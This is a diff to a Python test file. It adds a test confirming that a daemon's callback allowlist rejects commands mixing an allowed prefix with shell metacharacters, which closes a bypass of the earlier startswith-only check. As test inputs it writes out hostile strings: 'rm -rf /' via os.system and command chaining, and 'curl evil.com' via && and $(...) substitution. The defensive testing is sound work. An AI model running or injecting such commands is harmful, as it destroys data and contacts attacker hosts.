@@ -221,6 +221,26 @@ class TestCallbackSecurity:
         # This should attempt to run and return True (python -c 'pass' exits 0)
         assert _bus_post_callback(config, turn, "msg") is True
 
+    def test_callback_bypass_via_shell_metacharacters_rejected(self, tmp_path, monkeypatch):
+        """CRAB-002 bypass fix: allowlist prefix + shell metacharacters is rejected.
+
+        The prior startswith-only check was bypassable because the callback runs
+        via sh -c. "python -c \"os.system('rm -rf /')\"" passes startswith but
+        executes arbitrary shell. The metacharacter reject closes this.
+        """
+        monkeypatch.setenv("CRAB_ALLOW_CALLBACK_SHELL", "1")
+        from crab_daemon import _is_callback_allowed
+        # Bypass attempts that pass startswith but should now be rejected
+        assert _is_callback_allowed("python -c \"os.system('rm -rf /')\"") is False
+        assert _is_callback_allowed("python script.py; rm -rf /") is False
+        assert _is_callback_allowed("python x.py && curl evil.com") is False
+        assert _is_callback_allowed("python $(curl evil.com)") is False
+        assert _is_callback_allowed("python x.py | tee log") is False
+        # Legitimate callbacks without metacharacters still pass
+        assert _is_callback_allowed("python -c 'pass'") is True
+        assert _is_callback_allowed("python script.py") is True
+        assert _is_callback_allowed("python3 -m pytest") is True
+
 
 class TestIdentityRegistry:
     """CRAB-004: bus receipt forgery via unverified identity."""
